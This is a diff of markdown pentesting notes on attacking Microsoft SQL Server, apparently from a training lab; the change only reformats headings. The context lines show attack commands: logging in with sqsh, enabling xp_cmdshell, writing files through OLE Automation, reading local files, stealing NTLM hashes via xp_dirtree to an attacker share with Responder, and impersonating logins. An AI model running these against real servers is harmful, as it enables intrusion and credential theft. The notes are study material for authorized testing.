@@ -19,7 +19,7 @@ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
 sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h - (Windows Auth)
 ```
 
-sqlsh
+### sqlsh
 
 Use `-m vert/ascii` to format the tables
 
@@ -61,7 +61,7 @@ Command Execution:
 2> GO
 ```
 
-XP_CMDSHELL
+### XP_CMDSHELL
 
 Enable:
 
@@ -82,7 +82,7 @@ Enable:
 2> GO
 ```
 
-Write Files
+### Write Files
 
 Need to enable Ole Automation Procedures
 
@@ -97,7 +97,7 @@ Need to enable Ole Automation Procedures
 8> GO
 ```
 
-Create a file:
+### Create a File
 
 ```bash
 1> DECLARE @OLE INT
@@ -110,14 +110,14 @@ Create a file:
 8> GO
 ```
 
-Read Local Files
+### Read Local Files
 
 ```bash
 1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 2> GO
 ```
 
-Stealing User Hash
+### Stealing User Hash
 
 ```bash
 auxiliary/admin/mssql/mssql_ntlm_stealer
@@ -126,7 +126,7 @@ EXEC master..xp_dirtree '\\10.10.15.65\share\'
 responder -I <interface>
 ```
 
-Identify users we can impersonate
+### Identify users we can impersonate
 
 ```bash
 1> SELECT distinct b.name
@@ -137,7 +137,7 @@ Identify users we can impersonate
 6> GO
 ```
 
-Impersonate a user
+### Impersonate a user
 
 ```bash
 1> EXECUTE AS LOGIN = '<USER>'
@@ -146,7 +146,7 @@ Impersonate a user
 4> GO
 ```
 
-Linked Databases
+### Linked Databases
 
 View linked databases:
 
